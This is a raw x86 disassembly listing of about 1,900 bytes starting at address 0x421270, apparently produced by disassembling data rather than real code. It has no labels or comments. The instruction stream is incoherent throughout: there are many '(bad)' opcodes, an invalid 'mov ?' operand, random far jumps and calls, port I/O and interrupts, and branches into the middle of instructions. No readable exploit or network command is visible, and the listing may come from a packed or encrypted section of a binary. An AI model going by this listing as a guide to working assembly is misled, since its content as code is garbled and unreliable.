  421270:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421271:	sbb    BYTE PTR [eax],dl
  421273:	ror    BYTE PTR [edx],1
  421275:	jg     0x4212d2
  421277:	xor    eax,0x41209b5d
  42127c:	push   eax
  42127d:	push   esp
  42127e:	push   ecx
  42127f:	sbb    DWORD PTR [eax],eax
  421281:	add    dl,dl
  421283:	and    dl,BYTE PTR [esi-0x21410966]
  421289:	push   0x52
  42128b:	push   ds
  42128c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42128d:	and    cl,BYTE PTR [edi-0x57c4fe44]
  421293:	xchg   DWORD PTR [ecx],eax
  421295:	add    BYTE PTR [esi],ah
  421297:	add    eax,DWORD PTR [eax]
  421299:	add    BYTE PTR [esi+0x6b],ah
  42129c:	bound  ebx,QWORD PTR [esi+0x4e]
  42129f:	std    
  4212a0:	pusha  
  4212a1:	scas   eax,DWORD PTR es:[edi]
  4212a2:	lea    ecx,[ebx+eax*1-0x3b1e3e17]
  4212a9:	loopne 0x4212fd
  4212ab:	xchg   esp,eax
  4212ac:	aam    0xe7
  4212ae:	jns    0x42125a
  4212b0:	mov    edx,0xed920a1c
  4212b5:	arpl   WORD PTR [ebp+0x2a],sp
  4212b8:	pop    ss
  4212b9:	dec    esp
  4212ba:	xchg   edx,eax
  4212bb:	adc    ebp,DWORD PTR [esi+0x22]
  4212be:	xlat   BYTE PTR ds:[ebx]
  4212bf:	cvtdq2ps xmm5,XMMWORD PTR [edx]
  4212c2:	cld    
  4212c3:	dec    esi
  4212c4:	mov    bl,0x74
  4212c6:	dec    edi
  4212c7:	adc    DWORD PTR [ebp+0x15],eax
  4212ca:	pop    ebp
  4212cb:	lods   al,BYTE PTR ds:[esi]
  4212cc:	mov    al,ds:0xc712c0cb
  4212d1:	lds    ebp,FWORD PTR [ebx-0x7]
  4212d4:	mov    eax,0xf84e7eb7
  4212d9:	cmp    BYTE PTR [edi-0x58a37744],ch
  4212df:	fcom   QWORD PTR [eax-0x536ad87]
  4212e5:	push   esp
  4212e6:	xlat   BYTE PTR ds:[ebx]
  4212e7:	add    dl,dl
  4212e9:	cmp    ecx,DWORD PTR [ebp-0x54]
  4212ec:	mov    bh,0x8d
  4212ee:	inc    eax
  4212ef:	scas   eax,DWORD PTR es:[edi]
  4212f0:	outs   dx,DWORD PTR ds:[esi]
  4212f1:	das    
  4212f2:	push   ecx
  4212f3:	xchg   ebp,eax
  4212f4:	outs   dx,DWORD PTR ds:[esi]
  4212f5:	adc    esi,esi
  4212f7:	xor    eax,0x5c614414
  4212fc:	inc    esi
  4212fd:	ins    DWORD PTR es:[edi],dx
  4212fe:	ins    DWORD PTR es:[edi],dx
  4212ff:	push   ebx
  421300:	sar    DWORD PTR [esp+ecx*4],0x7e
  421304:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421305:	mov    edx,0x4eaf0d72
  42130a:	jb     0x421334
  42130c:	sahf   
  42130d:	(bad)  
  42130e:	push   ebp
  42130f:	sbb    cl,BYTE PTR [ebx]
  421311:	mov    ebx,0x6bed3a96
  421316:	jmp    0xc321:0xeb082a15
  42131d:	or     edi,edx
  42131f:	clc    
  421320:	in     eax,dx
  421321:	fwait
  421322:	mov    al,0x7a
  421324:	clc    
  421325:	push   ss
  421326:	sbb    al,0x76
  421328:	not    BYTE PTR [esi-0x28baca7]
  42132e:	mov    ebx,DWORD PTR [ebp-0x11]
  421331:	mov    cs,esp
  421333:	sub    eax,0x3f1e80a5
  421338:	repnz out 0xb7,al
  42133b:	jo     0x421321
  42133d:	push   0x25
  42133f:	test   esp,0x9d17bd7e
  421345:	(bad)  
  421346:	test   eax,0x5e9ffc0a
  42134b:	enter  0x6f16,0x38
  42134f:	or     eax,0x738f0382
  421354:	aad    0x55
  421356:	and    bh,ah
  421358:	neg    DWORD PTR [ebp+0x56b111c2]
  42135e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42135f:	enter  0x2068,0xc6
  421363:	mov    esi,0x991a244e
  421368:	sar    DWORD PTR [eax],0x90
  42136b:	cs jl  0xa19c55e6
  421372:	xor    al,0x6d
  421374:	fsub   st(0),st
  421376:	add    DWORD PTR fs:[eax+0x410e2666],edi
  42137d:	lods   eax,DWORD PTR ds:[esi]
  42137e:	adc    BYTE PTR [edi+ecx*1],bl
  421381:	(bad)  
  421382:	lock mov eax,0x111e265a
  421388:	xor    ecx,DWORD PTR [edi]
  42138a:	fld    DWORD PTR [esi]
  42138c:	mov    ebp,DWORD PTR [ecx+0x2554f92e]
  421392:	add    esi,eax
  421394:	fdivr  DWORD PTR [eax]
  421396:	addr16 gs and ebx,edx
  42139a:	xchg   dh,al
  42139c:	xor    BYTE PTR [edx],ah
  42139e:	data16 (bad) 
  4213a0:	aaa    
  4213a1:	mov    ds:0xa6978a50,al
  4213a6:	cmp    eax,0xe06281a2
  4213ab:	sbb    al,0x6e
  4213ad:	inc    edx
  4213ae:	test   BYTE PTR [ebp+eiz*2+0x7b],dh
  4213b2:	cdq    
  4213b3:	adc    al,0x63
  4213b5:	push   ebx
  4213b6:	loop   0x4213c3
  4213b8:	push   edx
  4213b9:	and    cl,BYTE PTR [ecx-0x606d8d87]
  4213bf:	ins    DWORD PTR es:[edi],dx
  4213c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4213c1:	call   0xdc85:0xa0813176
  4213c8:	push   cs
  4213c9:	pop    ebp
  4213ca:	leave  
  4213cb:	pop    es
  4213cc:	repz or DWORD PTR [ecx],edx
  4213cf:	xlat   BYTE PTR ds:[ebx]
  4213d0:	push   edx
  4213d1:	or     ecx,DWORD PTR [edi]
  4213d3:	and    eax,DWORD PTR [ecx-0xc]
  4213d6:	fild   QWORD PTR [edx-0x37]
  4213d9:	adc    eax,0x72e2bb48
  4213de:	stos   BYTE PTR es:[edi],al
  4213df:	mov    ecx,0x37c6e0c5
  4213e4:	adc    al,BYTE PTR [eax+ebp*2+0x538196dc]
  4213eb:	(bad)  
  4213ec:	and    eax,0x1708a93
  4213f1:	or     ebx,DWORD PTR [eax-0x1566bf6f]
  4213f7:	pushf  
  4213f8:	clc    
  4213f9:	aam    0xf4
  4213fb:	mov    cl,al
  4213fd:	adc    dh,ch
  4213ff:	push   ds
  421400:	and    eax,0x3db2b15c
  421405:	mov    bh,0x8b
  421407:	gs pusha 
  421409:	rcl    ebp,0x78
  42140c:	push   ebp
  42140d:	xchg   dl,ch
  42140f:	mov    ecx,0x1b10a9f9
  421414:	push   esi
  421415:	ss push 0x25
  421418:	ins    BYTE PTR es:[edi],dx
  421419:	arpl   WORD PTR ds:0x11f54ddf,di
  42141f:	test   eax,0x9bda4d58
  421424:	dec    esi
  421425:	lea    ebx,[ebx+eiz*2+0x672b100a]
  42142c:	into   
  42142d:	shl    DWORD PTR [esi],0xee
  421430:	jno    0x421463
  421432:	shl    edx,cl
  421434:	ss pop edx
  421436:	cmp    edx,DWORD PTR [edi-0x18876eec]
  42143c:	(bad)
  421440:	fwait
  421441:	pop    esp
  421442:	dec    ebx
  421443:	stos   DWORD PTR es:[edi],eax
  421444:	xchg   esi,eax
  421445:	sub    BYTE PTR [edx],ah
  421447:	fimul  DWORD PTR [edi-0x24]
  42144a:	inc    esi
  42144b:	pusha  
  42144c:	sbb    bh,BYTE PTR [eax-0x23b7ec38]
  421452:	std    
  421453:	jge    0x42142c
  421455:	(bad)
  42145a:	je     0x42146d
  42145c:	cdq    
  42145d:	imul   esp,DWORD PTR [edi-0x20550e3f],0x11
  421464:	(bad)  
  421465:	loope  0x421407
  421467:	sub    esp,edi
  421469:	jp     0x4214cd
  42146b:	fidivr WORD PTR [edi-0x1a]
  42146e:	(bad)  
  42146f:	cmp    al,0x3e
  421471:	es aam 0x43
  421474:	(bad)  
  421475:	in     al,0x31
  421477:	lea    esp,[esi-0x4a]
  42147a:	dec    ebx
  42147b:	inc    edx
  42147c:	ds xchg eax,ebp
  42147f:	add    eax,0xfc2d03e6
  421484:	jo     0x421460
  421486:	nop
  421487:	pop    ebp
  421488:	dec    ebx
  421489:	push   eax
  42148a:	cs cmc 
  42148c:	xlat   BYTE PTR ds:[ebx]
  42148d:	adc    bh,dl
  42148f:	lds    eax,FWORD PTR [eax]
  421491:	adc    DWORD PTR [ecx+0x67be9998],esp
  421497:	scas   al,BYTE PTR es:[edi]
  421498:	fs call 0x482c6559
  42149e:	(bad)  
  42149f:	dec    esp
  4214a0:	aam    0x83
  4214a2:	outs   dx,BYTE PTR ds:[esi]
  4214a3:	mov    esi,0xcea8fbe0
  4214a8:	push   ds
  4214a9:	test   BYTE PTR [eax+0x20027b5e],dl
  4214af:	dec    ecx
  4214b0:	xchg   DWORD PTR [ebp-0x13],ebp
  4214b3:	js     0x421435
  4214b5:	inc    esi
  4214b6:	xchg   ecx,eax
  4214b7:	mov    ah,0x9b
  4214b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4214ba:	adc    eax,DWORD PTR [ebp-0x72fb6517]
  4214c0:	fninit 
  4214c2:	pop    es
  4214c3:	in     eax,dx
  4214c4:	dec    ebp
  4214c5:	cli    
  4214c6:	call   0x4501:0x66f232b4
  4214cd:	inc    edi
  4214ce:	clc    
  4214cf:	jl     0x421476
  4214d1:	hlt    
  4214d2:	jbe    0x4214d2
  4214d4:	xchg   DWORD PTR [edx+ebx*8],esi
  4214d7:	xor    eax,0x33ac4ef5
  4214dc:	adc    eax,0xdb618de0
  4214e1:	push   ecx
  4214e2:	add    BYTE PTR [esi+0x7],bh
  4214e5:	stc    
  4214e6:	or     eax,0xbf186285
  4214eb:	loopne 0x421510
  4214ed:	inc    ecx
  4214ee:	inc    edi
  4214ef:	leave  
  4214f0:	in     eax,dx
  4214f1:	repnz sub al,0x89
  4214f4:	sbb    al,0xe0
  4214f6:	jmp    0x421478
  4214f8:	xchg   ebx,eax
  4214f9:	stc    
  4214fa:	xchg   BYTE PTR [esi-0x24],bl
  4214fd:	jle    0x42154a
  4214ff:	aam    0x24
  421501:	inc    ecx
  421502:	lock call 0x5f4c771
  421508:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421509:	aas    
  42150a:	les    edx,FWORD PTR [eax+0x25]
  42150d:	dec    edx
  42150e:	dec    ecx
  42150f:	(bad)  
  421510:	in     eax,0xef
  421512:	inc    edi
  421513:	and    ebp,DWORD PTR [esi]
  421515:	aaa    
  421516:	adc    DWORD PTR [ecx],esi
  421518:	add    al,0xf
  42151a:	xor    al,0x6d
  42151c:	inc    ebx
  42151d:	mov    dh,0x75
  42151f:	sar    BYTE PTR [esi+0x19],cl
  421522:	int    0x3
  421524:	mov    dl,0x8c
  421526:	mov    ecx,0x265993f2
  42152b:	mov    ds:0xd7eaeb34,al
  421530:	jnp    0x4215b1
  421532:	leave  
  421533:	dec    esp
  421534:	jge    0x42151c
  421536:	out    dx,eax
  421537:	addr16 cmp al,0xb8
  42153a:	cmp    ebp,DWORD PTR [esi]
  42153c:	sti    
  42153d:	mov    al,0x2a
  42153f:	cmp    DWORD PTR gs:[esi+edx*4+0x1f76159c],ecx
  421547:	imul   edi,DWORD PTR [edi+ecx*2],0x3bddcb60
  42154e:	xchg   esi,eax
  42154f:	mov    ds:0xffeb43e9,al
  421554:	call   0x81b8:0xbf8f0332
  42155b:	pop    ebx
  42155c:	xchg   esi,eax
  42155d:	ret    
  42155e:	push   eax
  42155f:	pop    ds
  421560:	xchg   ebx,eax
  421561:	int    0x13
  421563:	sahf   
  421564:	xchg   esi,eax
  421565:	mov    ds:0x4d7fb1d8,eax
  42156a:	sbb    BYTE PTR [ebp+0x1f],bl
  42156d:	mov    dh,0x56
  42156f:	xor    DWORD PTR [edx],ecx
  421571:	sbb    eax,0x2123164
  421576:	shr    BYTE PTR [eax+0x55],cl
  421579:	jle    0x4215d7
  42157b:	and    al,0xca
  42157d:	mov    bl,0x42
  42157f:	mov    dh,BYTE PTR [ecx-0x6e]
  421582:	scas   eax,DWORD PTR es:[edi]
  421583:	retf   0x38b4
  421586:	test   eax,0xa29e681b
  42158b:	mov    al,ds:0xb054ea91
  421590:	mov    bl,0x5f
  421592:	(bad)  
  421593:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421594:	inc    edi
  421595:	lods   al,BYTE PTR ds:[esi]
  421596:	jns    0x42154b
  421598:	push   ecx
  421599:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42159a:	cmp    DWORD PTR [esi+0x3f22e04c],eax
  4215a0:	xchg   esi,eax
  4215a1:	pop    ss
  4215a2:	enter  0x7e4,0x87
  4215a6:	jo     0x42156f
  4215a8:	fisttp QWORD PTR [edi]
  4215aa:	inc    esi
  4215ab:	ins    DWORD PTR es:[edi],dx
  4215ac:	ins    BYTE PTR es:[edi],dx
  4215ad:	js     0x421545
  4215af:	xchg   edx,eax
  4215b0:	out    dx,eax
  4215b1:	fs mov edx,0xd25d529
  4215b8:	sbb    eax,0x79ec55db
  4215bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4215be:	pop    ebx
  4215bf:	push   0x0
  4215c1:	add    ch,bl
  4215c3:	cmp    al,0x8f
  4215c5:	mov    esp,0x7dffbfef
  4215ca:	add    al,BYTE PTR [ebp-0x734c723f]
  4215d0:	pusha  
  4215d1:	xchg   edi,eax
  4215d2:	into   
  4215d3:	mov    al,BYTE PTR [ecx]
  4215d5:	add    BYTE PTR [esi],ah
  4215d7:	add    eax,DWORD PTR [eax]
  4215d9:	add    BYTE PTR [edi+edx*8+0x7fd72b1d],bl
  4215e0:	in     eax,dx
  4215e1:	test   BYTE PTR [ebx],dl
  4215e3:	and    DWORD PTR [ecx+0x57],eax
  4215e6:	imul   ecx,DWORD PTR [ebx],0xffffffc2
  4215e9:	hlt    
  4215ea:	add    eax,0x546519ab
  4215ef:	or     al,0x20
  4215f1:	xor    al,0x5f
  4215f3:	sbb    BYTE PTR gs:0x3bc8c9a9,al
  4215fa:	and    DWORD PTR [ebp+0x219c49fa],0x57
  421601:	ins    BYTE PTR es:[edi],dx
  421602:	push   ds
  421603:	neg    DWORD PTR [edi+0x6e]
  421606:	pop    es
  421607:	gs lock ds push fs
  42160c:	pop    edi
  42160d:	add    dh,bl
  42160f:	inc    ecx
  421610:	adc    BYTE PTR [eax-0x4d95f77b],bl
  421616:	xor    al,0xa7
  421618:	and    bl,BYTE PTR [edi+ebx*1]
  42161b:	shr    DWORD PTR [ebx-0x2f1de144],0xd0
  421622:	sti    
  421623:	(bad)  
  421624:	mov    ?,WORD PTR [edx+0x7f]
  421627:	inc    ebx
  421628:	outs   dx,DWORD PTR ds:[esi]
  421629:	int3   
  42162a:	stos   BYTE PTR es:[edi],al
  42162b:	stc    
  42162c:	or     edi,DWORD PTR [eax-0x71704867]
  421632:	or     cl,BYTE PTR [esi+0x1e]
  421635:	push   eax
  421636:	outs   dx,BYTE PTR ds:[esi]
  421637:	xchg   ecx,eax
  421638:	int3   
  421639:	stos   BYTE PTR es:[edi],al
  42163a:	jne    0x421675
  42163c:	jbe    0x4216b4
  42163e:	aas    
  42163f:	push   es
  421640:	add    al,0xee
  421642:	dec    ecx
  421643:	xchg   ebx,eax
  421644:	push   esp
  421645:	sub    DWORD PTR [ecx+0x28b76b96],esi
  42164b:	test   BYTE PTR [edx+0x7b22a26e],dl
  421651:	cdq    
  421652:	pop    edx
  421653:	ins    BYTE PTR es:[edi],dx
  421654:	add    bh,BYTE PTR [esi+0x5e]
  421657:	inc    ebx
  421658:	xchg   BYTE PTR [eax+0x3b],al
  42165b:	and    dl,BYTE PTR [eax+ecx*2+0x7a]
  42165f:	push   ss
  421660:	sub    al,BYTE PTR [edi]
  421662:	scas   eax,DWORD PTR es:[edi]
  421663:	jbe    0x421623
  421665:	push   es
  421666:	push   edx
  421667:	test   BYTE PTR [esi-0x52],dh
  42166a:	push   0x9b307347
  42166f:	jae    0x42168d
  421671:	rcr    BYTE PTR [edi+0x6b],0x8c
  421675:	gs push edx
  421677:	pop    esi
  421678:	jb     0x4216a1
  42167a:	jmp    0x6d0c:0xfc882a13
  421681:	ins    DWORD PTR es:[edi],dx
  421682:	test   DWORD PTR [ebp-0x1b9a74b7],0x8b5d7fa2
  42168c:	ret    
  42168d:	mov    DWORD PTR [edi],edi
  42168f:	out    dx,al
  421690:	add    BYTE PTR [ecx+ecx*8-0x49],dl
  421694:	add    esi,eax
  421696:	mov    bl,0x60
  421698:	std    
  421699:	mov    ah,0xff
  42169b:	push   0x357e83f
  4216a0:	adc    BYTE PTR [eax-0x31],bl
  4216a3:	jnp    0x421680
  4216a5:	push   ss
  4216a6:	sbb    cl,ah
  4216a8:	lahf   
  4216a9:	popa   
  4216aa:	cmc    
  4216ab:	in     al,dx
  4216ac:	int    0x15
  4216ae:	mov    ds:0x3c87dd6c,eax
  4216b3:	outs   dx,BYTE PTR ds:[esi]
  4216b4:	cmp    DWORD PTR cs:[edi-0x26],esp
  4216b8:	or     eax,0xe49859c0
  4216bd:	daa    
  4216be:	dec    eax
  4216bf:	js     0x42164a
  4216c1:	mov    BYTE PTR [ebx-0x306f6df0],al
  4216c7:	cs int3 
  4216c9:	gs push edx
  4216cb:	pop    edi
  4216cc:	or     eax,0x5911d4a5
  4216d1:	push   ecx
  4216d2:	jg     0x4216a0
  4216d4:	dec    ebp
  4216d5:	fistp  DWORD PTR ds:0x1ef26631
  4216db:	mov    ebp,0x5bac3f89
  4216e0:	cmp    BYTE PTR [edi],0x9a
  4216e3:	data16 adc bh,ch
  4216e6:	pop    ss
  4216e7:	sub    BYTE PTR [ebx-0x64622c0c],dh
  4216ed:	sub    eax,0x852b67c8
  4216f2:	push   eax
  4216f3:	and    edi,DWORD PTR [edi+0x65]
  4216f6:	(bad)  
  4216f7:	cmp    eax,0x4ba480bc
  4216fc:	fldenv [edx+0x56]
  4216ff:	add    eax,0xfd98b746
  421704:	jo     0x42176d
  421706:	xchg   esi,eax
  421707:	lds    ecx,FWORD PTR [edi]
  421709:	repnz (bad) 
  42170b:	pop    edi
  42170c:	pop    es
  42170d:	inc    ebp
  42170e:	inc    esi
  42170f:	sbb    al,0xd9
  421711:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421712:	cmp    edi,esp
  421714:	ret    0x4b30
  421717:	cmp    al,0x8
  421719:	sub    DWORD PTR [ebp-0x1207093c],esi
  42171f:	fisubr WORD PTR ds:0xa3be8ccd
  421725:	mov    edx,0xa7896fa2
  42172a:	fwait
  42172b:	iret   
  42172c:	fidiv  DWORD PTR [ebx+0x69]
  42172f:	cmp    al,0x89
  421731:	fimul  DWORD PTR [edi-0x36]
  421734:	mov    bl,0x74
  421736:	mov    al,0xd1
  421738:	pop    DWORD PTR [ebx+eax*4+0x592528f]
  42173f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421740:	pop    ds
  421741:	pop    ecx
  421742:	inc    ecx
  421743:	mov    ds:0x400e5469,eax
  421748:	xor    ebx,DWORD PTR ss:[edi-0x3c]
  42174c:	mov    eax,ds:0xcefffc61
  421751:	cmp    BYTE PTR cs:[ebx+0x7806062a],ah
  421758:	sub    DWORD PTR [edi-0x30f9b32f],esp
  42175e:	out    dx,al
  42175f:	das    
  421760:	retf   0x8c48
  421763:	cmp    DWORD PTR [eax+0x4426b033],esp
  421769:	or     al,0xb2
  42176b:	stos   BYTE PTR es:[edi],al
  42176c:	pop    ebp
  42176d:	push   esp
  42176e:	lahf   
  42176f:	or     dh,BYTE PTR [edx]
  421771:	leave  
  421772:	mov    DWORD PTR [ebp+0x5c],edi
  421775:	and    eax,0xe2bec9d
  42177a:	call   0xeff2c772
  42177f:	cmp    bh,BYTE PTR [edx]
  421781:	mov    dl,0x4f
  421783:	pusha  
  421784:	int    0x78
  421786:	js     0x42179a
  421788:	ins    BYTE PTR es:[edi],dx
  421789:	xlat   BYTE PTR ds:[ebx]
  42178a:	mov    ds:0x5fc143c2,eax
  42178f:	sti    
  421790:	dec    ecx
  421791:	xchg   edx,eax
  421792:	sub    dl,BYTE PTR [eax-0x3218af74]
  421798:	add    BYTE PTR [edx-0x750e0975],al
  42179e:	outs   dx,DWORD PTR ds:[esi]
  42179f:	pop    ecx
  4217a0:	add    bh,dh
  4217a2:	dec    ebp
  4217a3:	or     DWORD PTR [ebx+0x4e2f260],edx
  4217a9:	out    dx,al
  4217aa:	mov    bl,bl
  4217ac:	jl     0x421772
  4217ae:	std    
  4217af:	xchg   DWORD PTR [ebx],edi
  4217b1:	sti    
  4217b2:	outs   dx,BYTE PTR ds:[esi]
  4217b3:	(bad)  
  4217b4:	ds fwait
  4217b6:	push   ebx
  4217b7:	sbb    DWORD PTR [eax-0x2a],esp
  4217ba:	clc    
  4217bb:	loop   0x421754
  4217bd:	dec    edx
  4217be:	inc    ebp
  4217bf:	mov    ebp,0x35ac740c
  4217c4:	mov    edx,0x716f696c
  4217c9:	cs mov ah,0xc7
  4217cc:	mov    esi,0x68d56a39
  4217d1:	inc    edi
  4217d2:	rol    BYTE PTR [edx],0xb3
  4217d5:	cmp    DWORD PTR [ebx-0x59],edi
  4217d8:	inc    ecx
  4217da:	xchg   esp,eax
  4217db:	loope  0x42183d
  4217dd:	sub    al,0x44
  4217df:	add    al,0xc1
  4217e1:	push   esi
  4217e2:	(bad)  [edi]
  4217e4:	rcr    DWORD PTR [esi],1
  4217e6:	jp     0x4217db
  4217e8:	out    0x24,al
  4217ea:	and    DWORD PTR [esi+ebp*4],0x168c6dce
  4217f1:	inc    ebx
  4217f2:	int3   
  4217f3:	jl     0x4217ca
  4217f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4217f6:	ror    esi,cl
  4217f8:	mov    edx,0x54e2f60d
  4217fd:	popf   
  4217fe:	pop    edx
  4217ff:	xor    ebp,ecx
  421801:	mov    WORD PTR [ecx+0x21a2c43e],ss
  421807:	(bad)  [ebx+0x7eb116eb]
  42180d:	mov    BYTE PTR [eax-0x32748cac],bl
  421813:	mov    DWORD PTR [edx+0x53],esp
  421816:	shl    DWORD PTR [ebx],cl
  421818:	sbb    eax,0x263653e9
  42181d:	add    DWORD PTR [esi-0x1e],edx
  421820:	and    eax,0x652cf57a
  421825:	out    dx,al
  421826:	mov    es,WORD PTR [ecx-0x26221bd]
  42182c:	push   ebp
  42182d:	hlt    
  42182e:	sar    DWORD PTR [esi],0x8f
  421831:	test   al,0xde
  421833:	xor    eax,esp
  421835:	not    ebp
  421837:	xor    BYTE PTR [esi+ecx*1-0x61],ch
  42183b:	mov    ch,0x75
  42183d:	test   eax,0x93ccd110
  421842:	xchg   esi,eax
  421843:	pop    DWORD PTR [eax+ecx*2+0x4c]
  421847:	ins    DWORD PTR es:[edi],dx
  421848:	mov    bl,0x73
  42184a:	repnz xor BYTE PTR [edx+ebp*2],0x0
  42184f:	mov    ah,0x12
  421851:	mov    WORD PTR [eax+eax*8+0x2b5feb96],es
  421858:	inc    eax
  421859:	leave  
  42185a:	ret    
  42185b:	mov    bh,0xa
  42185d:	loop   0x4217fd
  42185f:	adc    BYTE PTR [ebx-0x74],0x0
  421863:	mov    ebp,0x77c818a1
  421868:	in     eax,dx
  421869:	bound  edi,QWORD PTR [edx+0x6236d063]
  42186f:	cwde   
  421870:	or     DWORD PTR [esi+0x13240baf],esi
  421876:	cmp    ch,BYTE PTR [ebp-0x8a51e9f]
  42187c:	out    0x25,al
  42187e:	fmul   st(7),st
  421880:	(bad)  
  421881:	sub    BYTE PTR [eax+0x3e2eb522],al
  421887:	xchg   edi,eax
  421888:	rcl    BYTE PTR [ebp-0x3b3d3996],0x5
  42188f:	xlat   BYTE PTR ds:[ebx]
  421890:	mov    esi,ebp
  421892:	fadd   QWORD PTR [eax+ebx*1-0x32b30970]
  421899:	sti    
  42189a:	mov    DWORD PTR [eax+0x15],edx
  42189d:	and    eax,0xee7866bd
  4218a2:	add    al,BYTE PTR [eax-0x54cfb52]
  4218a8:	jge    0x42183c
  4218aa:	mov    eax,0xa826c49c
  4218af:	mov    dh,0xfd
  4218b1:	test   eax,0xf78a7abb
  4218b6:	and    BYTE PTR [ebx],bl
  4218b8:	aas    
  4218b9:	or     eax,0x58491960
  4218be:	stc    
  4218bf:	fisubr WORD PTR [ecx]
  4218c1:	mov    ds:0x76a06b8a,al
  4218c6:	sbb    BYTE PTR [ebp+eiz*4+0xb30ea81],bh
  4218cd:	push   edi
  4218ce:	mov    esp,0x863c34a9
  4218d3:	pop    es
  4218d4:	push   ds
  4218d5:	clc    
  4218d6:	repz mov al,ds:0xab0fd0b9
  4218dc:	test   ch,ch
  4218de:	in     al,0x20
  4218e0:	hlt    
  4218e1:	pusha  
  4218e2:	xchg   BYTE PTR [ebx],cl
  4218e4:	dec    ecx
  4218e5:	pop    edx
  4218e6:	jmp    0x19382e97
  4218eb:	mov    ebx,0xb06929a9
  4218f0:	sbb    ah,BYTE PTR [edi-0x1]
  4218f3:	fmul   QWORD PTR [eax-0x3b]
  4218f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4218f7:	and    eax,0xdeb0d5b0
  4218fc:	or     DWORD PTR [ecx],eax
  4218fe:	lahf   
  4218ff:	add    eax,DWORD PTR [eax]
  421901:	add    BYTE PTR [esi-0x4fd6421],dh
  421907:	inc    esi
  421908:	mov    edi,0x5e25f0ff
  42190d:	and    eax,0x62262cc6
  421912:	hlt    
  421913:	lea    eax,[ecx]
  421915:	add    BYTE PTR [esi],ah
  421917:	add    eax,DWORD PTR [eax]
  421919:	add    BYTE PTR [eax],bl
  42191b:	cmp    ebx,DWORD PTR [ecx+ecx*4]
  42191e:	pop    ebp
  42191f:	(bad)  
  421920:	nop
  421921:	stc    
  421922:	rcr    DWORD PTR [ecx-0x7e],1
  421925:	(bad)  
  421926:	mov    ebp,0x8c86604d
  42192b:	lds    ecx,FWORD PTR [ebx]
  42192d:	fstp   TBYTE PTR [ecx+0x2c]
  421930:	loopne 0x421974
  421932:	pop    esp
  421933:	xchg   ch,bl
  421935:	inc    esp
  421936:	je     0x421979
  421938:	mov    esp,0x28282ad8
  42193d:	jecxz  0x42198c
  42193f:	out    dx,eax
  421940:	jo     0x421999
  421942:	mov    BYTE PTR [eax+0x7e],cl
  421945:	push   eax
  421946:	or     eax,0xb495df05
  42194b:	mov    esp,0x2ebb114b
  421950:	(bad)  
  421951:	jnp    0x421963
  421953:	mov    esi,edi
  421955:	push   cs
  421956:	add    DWORD PTR ds:0x8f79156,0xed5c60f
  421960:	or     al,0xe5
  421962:	mov    ah,0x10
  421964:	mov    esp,0xb79c40ca
  421969:	pop    esp
  42196a:	pop    ds
  42196b:	lods   eax,DWORD PTR ds:[esi]
  42196c:	cmc    
  42196d:	mov    dh,bl
  42196f:	xor    bh,BYTE PTR [edi+0x1]
  421972:	sbb    al,0x48
  421974:	(bad)  
  421975:	hlt    
  421976:	mov    ebp,0x406cfb66
  42197b:	arpl   WORD PTR [ebx+0x12654b1d],cx
  421981:	jge    0x4219cf
  421983:	dec    ebx
  421984:	out    0xf,eax
  421986:	cmp    ebp,DWORD PTR [edx+eiz*2+0x720011f1]
  42198d:	std    
  42198e:	inc    ebx
  42198f:	mov    ds:0xff4d986a,eax
  421994:	loop   0x4219a1
  421996:	sbb    DWORD PTR [esi],edi
  421998:	mov    edi,0xea35dbdc
  42199d:	jp     0x42199c
  42199f:	pop    ebx
  4219a0:	mov    ch,dl
  4219a2:	(bad)  
  4219a3:	mov    eax,0xf65b7ae1
  4219a8:	xchg   edi,eax
  4219a9:	jb     0x421a08
  4219ab:	aam    0x24
  4219ad:	push   eax
  4219ae:	dec    edx
  4219af:	add    al,0xb5
  4219b1:	and    al,0x61
  4219b3:	in     al,0x7
  4219b5:	adc    DWORD PTR [edi+0x26],edx
  4219b8:	sub    al,0xf4
  4219ba:	cwde   
  4219bb:	sbb    eax,0x71727294
  4219c0:	dec    ebx
  4219c1:	in     eax,dx
  4219c2:	std    
  4219c3:	mov    al,ds:0x1bc6c9e3
  4219c8:	popa   
  4219c9:	cmp    DWORD PTR [edi+0xf],0x3c95f9f
  4219d0:	pop    ss
  4219d1:	lods   eax,DWORD PTR ds:[esi]
  4219d2:	rol    BYTE PTR [edi+0x47edc624],0xe
  4219d9:	iret   
  4219da:	mov    ah,0xbc
  4219dc:	ss push 0x7d
  4219df:	inc    ecx
  4219e0:	lock sub ebx,DWORD PTR [ecx+0x520076d6]
  4219e7:	jns    0x4219e8
  4219e9:	out    0x2c,al
  4219eb:	scas   eax,DWORD PTR es:[edi]
  4219ec:	adc    al,0x99
  4219ee:	mov    dh,0xe9
  4219f0:	mov    dh,0x97
  4219f2:	xchg   esi,eax
  4219f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4219f4:	xchg   esi,eax
  4219f5:	cmc    
  4219f6:	sub    esi,ebp
  4219f8:	ja     0x421992
  4219fa:	(bad)  
  4219fc:	add    BYTE PTR [ecx+0x7e],0x39
  421a00:	add    DWORD PTR [esi-0x74],ebx
  421a03:	push   esi
  421a04:	int3   
  421a05:	loop   0x4219dc
  421a07:	xor    al,0xb4
  421a09:	mov    cl,BYTE PTR [eax]
  421a0b:	jl     0x42199e
  421a0d:	add    eax,0xeb275f33
  421a12:	or     ch,cl
  421a14:	call   0xe99c:0xfba46337
  421a1b:	and    al,0x43
  421a1d:	and    BYTE PTR [edi+0xe],0x9e
  421a21:	and    BYTE PTR ds:0xbe1ccd05,dh
  421a27:	lods   eax,DWORD PTR ds:[esi]
  421a28:	jmp    0x4219ca
  421a2a:	adc    BYTE PTR [ebx+0x38],0x8a
  421a2e:	or     BYTE PTR [ebx],bh
  421a30:	add    DWORD PTR [ecx+0x1730ce64],0x219a7544
  421a3a:	dec    ebp
